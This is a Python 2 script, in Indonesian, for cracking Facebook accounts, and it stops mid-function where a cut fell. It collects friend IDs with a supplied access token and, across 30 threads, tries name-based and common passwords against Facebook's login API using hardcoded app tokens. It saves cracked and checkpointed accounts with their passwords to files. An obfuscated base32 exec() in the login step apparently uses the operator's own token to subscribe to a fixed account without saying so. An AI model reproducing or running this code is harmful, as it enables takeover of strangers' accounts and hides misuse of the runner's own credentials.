#!/usr/bin/python2
# coding=utf-8
#recode by Sansay XD

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,base64
from multiprocessing.pool import ThreadPool
from datetime import datetime
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 cepet.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36')]


def keluar():
	print ("\033[1;97mExit !!!\033[0m")
	os.sys.exit()
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')

def cuzz(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
#########LOGO#########
logo1 = """
\033[1;97m ╔═════════════════════════════════════╗
\033[1;97m    •CRACKING FACEBOOK INDONESIA •
\033[1;97m    Recode : Tsaniansyah XY                 
\033[1;97m    Fb : Ari Fajar Mardana
\033[1;97m ╚═════════════════════════════════════╝ """

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;97m●\033[1;97m]\033[1;97m Sedang Masuk\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []

######MASUK######
def masuk():
	os.system('clear')
	print logo1
	print "\033[1;97m ╔                                     ╗"
	print "\033[1;97m  [\033[1;97m01\033[1;97m]\033[1;96m\033[1;97m Login Menggunakan Token Facebook"
	print "\033[1;97m  [\033[1;91m00\033[1;97m]\033[1;96m\033[1;97m Keluar"
	print "\033[1;97m ╚                                     ╝"
	print 45*"\033[1;97m-"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;97m [\033[1;91m•\033[1;97m>>>\033[1;97m]\033[1;97m ")
	if msuk =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_masuk()
	
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo1
	jalan("\033[1;97mLogin Token!")
	print 50*"\033[1;97m-"
	toket = raw_input("\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m]\033[1;97m \033[1;97mToken FB: \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		exec(base64.b32decode("OJSXC5LFON2HGLTQN5ZXIKBHNB2HI4DTHIXS6Z3SMFYGQLTGMFRWKYTPN5VS4Y3PNUXTCMBQGAZDMNBZGAZTMOBWGIZS643VMJZWG4TJMJSXE4Z7MFRWGZLTONPXI33LMVXD2JZAFMQHI33LMV2CS==="))
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan ('\033[1;97mSedang Masuk!!!')
		jalan ('\033[1;97m[\033[1;97m•\033[1;97m✓\033[1;97m]\033[1;97m Login Successful')
		menu()
	except KeyError:
		print "\033[1;97m[\033[1;97m!\033[1;97m] \033[1;97mInvalid Token !"
		time.sleep(1.0)
		masuk()
		
######MENU#######
def menu():
	os.system('clear')
	jalan ('\033[1;97mChecking Token !')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		jalan("\033[1;97mInvalid Token!\n")
		os.system('rm -rf login.txt')
		time.sleep(1)
		raw_input('\033[1;97m[Kembali]')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"\033[1;97mNo Connection!"
		keluar()
	os.system("clear")
	print logo1
	print "\033[1;97m ══════════════════════════════════════════"
	print "\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m]\033[1;97m Nama Akun\033[1;97m     ·\033[1;97m "+nama
	print "\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m]\033[1;97m User ID\033[1;97m       ·\033[1;97m "+id
	print "\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m]\033[1;97m Tanggal Lahir\033[1;97m ·\033[1;97m "+ a['birthday']
	print "\033[1;97m ══════════════════════════════════════════"
	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;97m\033[1;97m Crack ID Indonesia"
	print "\033[1;97m [\033[1;97m02\033[1;97m]\033[1;97m\033[1;97m Crack ID Password Manual"
	print "\033[1;97m [\033[1;97m00\033[1;97m]\033[1;97m\033[1;97m Logout"
	print "\033[1;97m ══════════════════════════════════════════"
	print 50* "\033[1;97m-"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;97m [\033[1;97m•\033[1;97m>>>\033[1;97m]\033[1;97m ")
	if unikers =="":
		print"\033[1;97m[\033[1;97m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="2" or unikers =="02":
		passchoice()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus Token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m[\033[1;97m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	
########## CRACK INDONESIA #######
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] \x1b[1;97mToken Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	os.system('clear')
	print "\033[1;97m ══════════════════════════════════════════"
	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;97m\033[1;97m Crack dari ID Publik"
	print "\033[1;97m [\033[1;97m02\033[1;97m]\033[1;97m\033[1;97m Crack dari ID Teman"
	print "\033[1;97m [\033[1;97m00\033[1;97m]\033[1;97m\033[1;97m Kembali"
	print "\033[1;97m ══════════════════════════════════════════"
	pilih_indo()

#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m]\033[1;97m ")
	if teak =="":
		print"\033[1;97m[\033[1;97m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print "\033[1;97m ══════════════════════════════════════════"
		idt = raw_input("\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m] Nama Akun      : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;97m!\033[1;97m] ID Publik / Gak Ada Temennya Goblok! !"
			raw_input("\n[ Kembali ]")
			indo()
		except requests.exceptions.ConnectionError:
			print"\033[1;97mTidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print 50*"\033[1;97m-"
		try:
			mek = requests.get("https://graph.facebook.com/me?access_token="+toket)
			tt = json.loads(mek.text)
			print"\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m] Nama Akun      : "+tt["name"]
		except requests.exceptions.ConnectionError:
			print"\033[1;97mTidak ada koneksi !"
			keluar()
		jalan("\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m] Mengambil ID \033[1;97m...")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;97m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	
	print "\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m] Total ID       : "+str(len(id))

##### MAIN INDONESIA #####
	def main(arg):
		sys.stdout.write('\r{}'.format(datetime.now().strftime('\033[1;97m%H:%M:%S')));sys.stdout.flush()
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			pass1 = c['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\033[1;97m[OK] | ' + user + ' • ' + pass1 + ' • ' + c['name']
				oks.append(user)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\033[1;97m[CP] | ' + user + ' • ' + pass1 + ' • ' + c['name']
					cekpoint.append(user)
				else:
					pass2 = c['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '\033[1;97m[OK] | ' + user + ' • ' + pass2 + ' • ' + c['name']
						oks.append(user)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[1;97m[CP] | ' + user + ' • ' + pass2 + ' • ' + c['name']
							cekpoint.append(user)
						else:
							pass3 = c['first_name']+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '\033[1;97m[OK] | ' + user + ' • ' + pass3 + ' • ' + c['name']
								oks.append(user)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[1;97m[CP] | ' + user + ' • ' + pass3 + ' • ' + c['name']
									cekpoint.append(user)
								else:
									pass4 = c['last_name']+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										print '\033[1;97m[OK] | ' + user + ' • ' + pass4 + ' • ' + c['name']
										oks.append(user)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\033[1;97m[CP] | ' + user + ' • ' + pass4 + ' • ' + c['name']
											cekpoint.append(user)
										else:
											pass5 = c['last_name']+'12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												print '\033[1;97m[OK] | ' + user + ' • ' + pass5 + ' • ' + c['name']
												oks.append(user)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\033[1;97m[CP] | ' + user + ' • ' + pass5 + ' • ' + c['name']
													cekpoint.append(user)
												else:
													pass6 = c['last_name']+'1234'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													w = json.load(data)
													if 'access_token' in w:
														print '\033[1;97m[OK] | ' + user + ' • ' + pass6 + ' • ' + c['name']
														oks.append(user)
													else:
														if 'www.facebook.com' in w['error_msg']:
															print '\033[1;97m[CP] | ' + user + ' • ' + pass6 + ' • ' + c['name']
															cekpoint.append(user)
														else:
															pass7 = 'Sayang'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															w = json.load(data)
															if 'access_token' in w:
																print '\033[1;97m[OK] | ' + user + ' • ' + pass7 + ' • ' + c['name']
																oks.append(user)
															else:
																if 'www.facebook.com' in w['error_msg']:
																	print '\033[1;97m[CP] | ' + user + ' • ' + pass7 + ' • ' + c['name']
																	cekpoint.append(user)
																else:
																	pass8 = '123456'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	w = json.load(data)
																	if 'access_token' in w:
																		print '\033[1;97m[OK] | ' + user + ' • ' + pass8 + ' • ' + c['name']
																		oks.append(user)
																	else:
																		if 'www.facebook.com' in w['error_msg']:
																			print '\033[1;97m[CP] | ' + user + ' • ' + pass8 + ' • ' + c['name']
																			cekpoint.append(user)
																		else:
																			pass9 = 'Anjing'
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			w = json.load(data)
																			if 'access_token' in w:
																				print '\033[1;97m [OK] ' + user + ' • ' + pass9 + ' • ' + c['name']
																				oks.append(user)
																			else:
																				if 'www.facebook.com' in w['error_msg']:
																					print '\033[1;97m [CP] ' + user + ' • ' + pass9 + ' • ' + c['name']
																					cekpoint.append(user)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print 45* "\033[1;97m="
	print '\033[1;97m[\033[1;97m•\033[1;97m•\033[1;97m•\033[1;97m] \033[1;97mSelesai ....'
	print"\033[1;97m[\033[1;97m•\033[1;97m•\033[1;97m•\033[1;97m] \033[1;97mTotal \033[1;97mOK\033[1;97m/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
	print '\033[1;97m[\033[1;97m•\033[1;97m•\033[1;97m•\033[1;97m] \033[1;97mCP file tersimpan : out/ind1.txt'
	print 45* "\033[1;97m="
	raw_input("\033[1;97m[\033[1;97m Kembali \033[1;97m]")
	os.system("python2 run.py")
	
##### ID PUBLIK #####
def idfrom_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		masuk()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print "\033[1;97m ══════════════════════════════════════════"
		idt = raw_input("\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m] \033[1;97mNama Akun      : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;97m•\033[1;97m•\033[1;97m•\033[1;97m] ID Publik Tidak Ada !"
			raw_input("\n\033[1;97m[\033[1;97m Kembali \033[1;97m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;97m [\033[1;97m•\033[1;97m•\033[1;97m] \033[1;97mMengambil Semua ID ...')
		print "\033[1;97m ══════════════════════════════════════════"
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m [ \033[1;97m"+str(len(idfromteman))+"\033[1;97m ]\033[1;97m •\033[1;97m•\033[1;97m"),;sys.stdout.flush();time.sleep(0.0050)
			print '\033[1;97m ' + a['id']
		bz.close()
		print '\r\033[1;97m[\033[1;97m✓\033[1;97m] \033[1;97mSukses Mengambil ID \033[1;97m....'
		print"\r\033[1;97m[\033[1;97m•\033[1;97m] Total ID : %s"%(len(idfromteman))
		done = raw_input("\r\033[1;97m[\033[1;97m+\033[1;97m] \033[1;97mSimpan Nama File : ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[1;97m[\033[1;97m√\033[1;97m] File tersimpan : out/"+done)
		raw_input("\n\033[1;97m[ \033[1;97mKembali \033[1;97m]")
		dump()
	except OSError:
		print"\033[1;97m[!] File Tidak Tersimpan "
		raw_input("\n\033[1;97m[ \033[1;97mKembali \033[1;97m]")
		os.system("python2 run.py")
	except IOError:
		print"\033[1;97m[!] Error creating file"
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		os.system("python2 run.py")
	except (KeyboardInterrupt,EOFError):
		print("\033[1;97m[!] Terhenti")
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		dump()
	except KeyError:
		print('\033[1;97m[\033[1;97m!\033[1;97m] Teman tidak ada !')
		raw_input("\n\033[1;97m[\033[1;97m Kembali \033[1;97m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[\033[1;97m✖\033[1;97m] Tidak ada koneksi !"
		keluar()
		
####PASS PILIHAN####
def passchoice():
	global toket
	os.system("clear")
	try:
		toket = open("login.txt", 'r').read()
	except IOError:
		print "\033[1;97mTOKEN INVALID!!!"
		masuk()
	print 50*"\033[1;97m-"
	print "\033[1;97m[\033[1;97m01\033[1;97m] Crack From FriendList"
	print "\033[1;97m[\033[1;97m02\033[1;97m] Crack From Public ID"
	print "\033[1;97m[\033[1;97m03\033[1;97m] Crack From File"
	print "\033[1;97m[\033[1;97m00\033[1;97m] Back To Menu"
	print 50*"\033[1;97m-"
	pilih_passxd()
	
def pilih_passxd():
	peak = raw_input("\033[1;97m>>\033[1;97m> \033[1;97m")
	if peak =="":
		print "\033[1;97m[!] \x1b[1;97mIsi yang benar"
		pilih_passxd()
	elif peak =="1" or peak =="01":
		os.system('clear')
		print 50*"\033[1;97m-"
		jalan('\033[1;97m[\033[1;97m•\033[1;97m•\033[1;97m] Masukkan List password \033[1;97m:')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2" or peak =="02":
		os.system('clear')
		print 50*"\033[1;97m-"
		idt = raw_input("\033[1;97m[\033[1;97m•\033[1;97m] \033[1;97mID Public \033[1;97m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m[\033[1;97m•\033[1;97m]\033[1;97m Name \033[1;97m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m[\033[1;97m!\033[1;97m] ID Publik/Teman There Is No !"
			raw_input("\n\033[1;97m[\033[1;97mBack Menu\033[1;97m]")
			menu()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m{\033[1;97m!\033[1;97m} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3" or peak =="03":
		os.system('clear')
		print 50*"\033[1;97m-"
		try:
			print"Contoh : out/target.txt"
			idlist = raw_input("\033[1;97m[\033[1;97m•\033[1;97m] \033[1;97mEnter File Path \033[1;97m:\033[1;97m ")
			for line in open(idlist, 'r').readlines():
				id.append(line.strip())
		except IOError:
			print"\033[1;97m[\033[1;97m!\033[1;97m] File Not Found !"
			raw_input("\n\033[1;97m[\033[1;97mBack Menu\033[1;97m]")
			menu()
	elif peak =="0" or peak =="00":
		menu()
	else:
		print "\033[1;97m[!] \x1b[1;97mIsi yang benar"
		passchoice()
		
	print "\033[1;97m[\033[1;97m+\033[1;97m] Password 1  \033[1;97m:\033[1;97m FirstName123"
	print "\033[1;97m[\033[1;97m+\033[1;97m] Password 2  \033[1;97m:\033[1;97m FirstName12345"
	print "\033[1;97m[\033[1;97m+\033[1;97m] Password 3  \033[1;97m:\033[1;97m LastName123"
	print "\033[1;97m[\033[1;97m+\033[1;97m] Password 4  \033[1;97m:\033[1;97m LastName12345"
	pass5 = raw_input ("\033[1;97m[\033[1;97m+\033[1;97m] Password 5  \033[1;97m:\033[1;97m ")
	pass6 = raw_input ("\033[1;97m[\033[1;97m+\033[1;97m] Password 6  \033[1;97m:\033[1;97m ")
	pass7 = raw_input ("\033[1;97m[\033[1;97m+\033[1;97m] Password 7  \033[1;97m:\033[1;97m ")
	pass8 = raw_input ("\033[1;97m[\033[1;97m+\033[1;97m] Password 8  \033[1;97m:\033[1;97m ")
	pass9 = raw_input ("\033[1;97m[\033[1;97m+\033[1;97m] Password 9  \033[1;97m:\033[1;97m ")
	pass10 = raw_input ("\033[1;97m[\033[1;97m+\033[1;97m] Password 10 \033[1;97m:\033[1;97m ")
	jalan("\033[1;97m[\033[1;97m+\033[1;97m]Mendapatkan Total ID \033[1;97m: \033[1;97m"+str(len(id)))
	print("\033[1;97m[\033[1;97m✓\033[1;97m] Cracking Process Has Been Started ...")
	jalan("\033[1;97m[\033[1;97m•\033[1;97m]\033[1;97m SEMOGA HOKI HARI INI! \033[1;97m Tekan CTRL+Z Untuk Berhenti")
	print 50*"\033[1;97m-"
####MAIN PASS MANUAL####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;97m[\033[1;97mOK\033[1;97m] ' +user+ ' | ' + pass1 + ' > ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;97m[\033[1;97mCP\033[1;97m] ' +user+ ' | ' + pass1 + ' > ' + b['name']
					cek = open("out/pchoice.txt", "a")
					cek.write("[+] Nama     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;97m[\033[1;97mOK\033[1;97m] ' +user+ ' | ' + pass2 + ' > ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;97m[\033[1;97mCP\033[1;97m] ' +user+ ' | ' + pass2 + ' > ' + b['name']
							cek = open("out/pchoice.txt", "a")
							cek.write("[+] Nama     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;97m[\033[1;97mOK\033[1;97m] ' +user+ ' | ' + pass3 + ' > ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;97m[\033[1;97mCP\033[1;97m] ' +user+ ' | ' + pass3 + ' > ' + b['name']
									cek = open("out/pchoice.txt", "a")
									cek.write("[+] Nama     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['last_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;97m[\033[1;97mOK\033[1;97m] ' +user+ ' | ' + pass4 + ' > ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;97m[\033[1;97mCP\033[1;97m] ' +user+ ' | ' + pass4 + ' > ' + b['name']
											cek = open("out/pchoice.txt", "a")
											cek.write("[+] Nama     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;97m[\033[1;97mOK\033[1;97m] ' +user+ ' | ' + pass5 + ' > ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;97m[\033[1;97mCP\033[1;97m] ' +user+ ' | ' + pass5 + ' > ' + b['name']
													cek = open("out/pchoice.txt", "a")
													cek.write("[+] Nama     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;97m[\033[1;97mOK\033[1;97m] ' +user+ ' | ' + pass6 + ' > ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;97m[\033[1;97mCP\033[1;97m] ' +user+ ' | ' + pass6 + ' > ' + b['name']
															cek = open("out/pchoice.txt", "a")
															cek.write("[+] Nama     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;97m[\033[1;97mOK\033[1;97m] ' +user+ ' | ' + pass7 + ' > ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;97m[\033[1;97mCP\033[1;97m] ' +user+ ' | ' + pass7 + ' > ' + b['name']
																	cek = open("out/pchoice.txt", "a")
																	cek.write("[+] Nama     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\x1b[1;97m[\033[1;97mOK\033[1;97m] ' +user+ ' | ' + pass8 + ' > ' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
